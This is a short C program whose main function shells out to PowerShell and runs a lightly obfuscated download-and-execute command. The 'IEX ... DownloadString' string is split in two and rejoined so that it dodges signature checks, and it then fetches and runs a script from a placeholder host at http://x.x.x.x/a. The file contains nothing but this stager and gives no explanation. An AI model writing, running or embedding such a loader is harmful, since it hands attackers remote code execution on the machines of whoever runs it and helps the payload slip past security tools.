	#include<stdio.h>
	#include<stdlib.h>
	int main(){
	system("powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)");
	return 0;
	}